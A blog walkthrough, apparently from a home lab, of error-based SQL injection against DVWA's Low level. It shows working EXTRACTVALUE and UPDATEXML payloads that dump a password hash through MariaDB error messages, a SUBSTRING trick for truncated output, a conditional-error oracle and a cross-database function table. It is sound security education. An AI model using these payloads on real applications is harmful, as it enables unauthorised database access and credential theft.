---
layout: post
title: "Error-based SQL Injection on DVWA Low: getting the database to confess in its own error messages"
date: 2026-05-30
categories: [web-security, walkthrough]
tags: [sqli, error-based, dvwa, extractvalue, mariadb]
excerpt: "UNION needed reflected output. Blind needed 220 requests. Error-based needed two. The database printed the full password hash inside its own error message, and I felt unreasonably clever about it — right up until I tried Medium."
---

The previous two sessions ended with credential dumps — one through UNION SELECT, one through 220 rounds of blind boolean extraction. UNION needed the output reflected in the page. Blind needed patience and Burp Intruder. This session is about a third technique: **error-based injection**, where you make the database generate an error whose text contains the data you want.

One request. Data inside the error message. Done.

The condition: the application must print database errors in the response. DVWA Low does exactly this — that `die(mysqli_error(...))` in the source code isn't just a vulnerability, it's a free exfiltration channel the developer built themselves.

## When to use which technique

Before picking a tool, you need to know what the application gives you:

| What the app shows | Technique |
|--------------------|-----------|
| Query output reflected in page | UNION-based |
| Database errors reflected in page | Error-based |
| Only behavioral difference (exists/missing) | Blind boolean |
| Nothing at all | Blind time-based |

The selection order in practice: try UNION first, then error-based, then fall back to blind. Each step down costs more requests per byte of data extracted.

## Confirming injection — the three-step check

Before attempting any extraction, verify that injection is possible and that errors are visible. Three requests:

```
?id=1        → 200, normal user output           → baseline
?id=1'       → SQL syntax error in page          → injection confirmed, errors visible
?id=1'--+    → 200, normal output again          → you control the SQL syntax
```

The third step is the one that matters: if `--+` neutralizes the error, the comment reached the SQL parser. You're in control.

## EXTRACTVALUE: the mechanism

`EXTRACTVALUE(xml, xpath)` is a MariaDB/MySQL function that reads a value from an XML document using an XPath expression. Legitimate use:

```sql
EXTRACTVALUE('<user><name>admin</name></user>', '/user/name')
-- returns: admin
```

The injection trick: if the XPath expression is invalid, the database raises an error — and includes the invalid expression in the error message. So if you build the XPath expression using a subquery, the database evaluates the subquery, tries to use the result as XPath, fails, and prints the result in the error.

```
?id=1'+AND+EXTRACTVALUE(1,CONCAT(0x7e,(SELECT+version())))--+
```

Response:

```
XPATH syntax error: '~10.1.26-MariaDB-0+deb9u1'
```

The version string — inside an error message. `0x7e` is `~` in hex, used as a separator to make the output readable. Without it the data blends into the error text.

Replace `version()` with something more interesting:

```
?id=1'+AND+EXTRACTVALUE(1,CONCAT(0x7e,(SELECT+password+FROM+users+WHERE+user='admin')))--+
```

Response:

```
XPATH syntax error: '~5f4dcc3b5aa765d61d8327deb882cf9'
```

Almost right — but the hash is 32 characters and only 31 are showing. This is a known limitation of `EXTRACTVALUE` on MariaDB: output is truncated at 31 characters. To get the last character, shift the window with `SUBSTRING`:

```
?id=1'+AND+EXTRACTVALUE(1,CONCAT(0x7e,SUBSTRING((SELECT+password+FROM+users+WHERE+user='admin'),31,32)))--+
```

Response:

```
XPATH syntax error: '~99'
```

Full hash: `5f4dcc3b5aa765d61d8327deb882cf99`. Two requests total, compared to the 220 the blind session needed for the same result. `UPDATEXML` works identically and has the same 31-character limit:

```
?id=1'+AND+UPDATEXML(1,CONCAT(0x7e,(SELECT+version())),1)--+
```

## Conditional errors with CASE WHEN — and MariaDB's surprise

PortSwigger's materials describe a technique where you trigger a conditional error to create a blind oracle: `CASE WHEN (condition) THEN 1/0 ELSE 1 END`. If the condition is true, division by zero crashes the database. If false, it returns 1 normally.

On PostgreSQL and MSSQL, `1/0` raises a fatal error. On MariaDB:

```
?id=1'+AND+(SELECT+CASE+WHEN+(1=1)+THEN+1/0+ELSE+1+END)--+
```

No error. Page empty — no user, no crash. MariaDB handles division by zero silently, returning NULL. The AND fails because NULL is not truthy, so no rows are returned. Then `1=2` shows the user normally.

The oracle is inverted from what I expected: **empty = condition true, user visible = condition false**. It works — but MariaDB isn't crashing, it's returning NULL. Worth knowing before you assume cross-database behavior.

## Error-based equivalents across databases

| Database | Function | Notes |
|----------|----------|-------|
| MySQL / MariaDB | `EXTRACTVALUE(1, CONCAT(0x7e, (payload)))` | 31-char limit |
| MySQL / MariaDB | `UPDATEXML(1, CONCAT(0x7e, (payload)), 1)` | 31-char limit |
| PostgreSQL | `CAST((payload) AS int)` | No char limit |
| MSSQL | `CONVERT(int, (payload))` | Error includes the value |
| Oracle | `CTXSYS.DRITHSX.SN(1, (payload))` | Requires specific privileges |

The pattern is the same everywhere: find a function that evaluates an expression and includes it in the error message when it fails. The specific function changes, the database stays the unwilling accomplice.

## Takeaways

- **Error-based is faster than blind when errors are visible.** Two requests to extract a 32-character hash vs 220. Verbose error handling is the attacker's best friend.
- **The 31-character limit in `EXTRACTVALUE` is real.** Use `SUBSTRING` to shift the window and recover truncated output.
- **`CASE WHEN 1/0` behaves differently on MariaDB.** It doesn't crash — it returns NULL. The oracle works, but it's inverted and the mechanism is different from what the PortSwigger labs describe on PostgreSQL.

---

**Two requests. Full credential dump. The database broken by its own error handler. At this point I felt fairly clever.**

**So I switched to Medium level, fired the same payload, and everything kept working perfectly. Suspiciously perfectly.**

**Turns out I was still on Low. The page said Medium. The cookie said otherwise.**

*— continues in [Part 2: Medium level](/posts/error-based-sql-injection-dvwa-medium)*

## Useful references

- [PortSwigger — SQL injection with conditional errors](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)
- [PayloadsAllTheThings — Error-based injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#error-based-injection)
- [MariaDB — EXTRACTVALUE](https://mariadb.com/kb/en/extractvalue/)

---

*All techniques shown were performed on an isolated lab environment running in Docker on my local machine. Running these attacks against systems you don't own or have written authorization to test is illegal in most jurisdictions.*
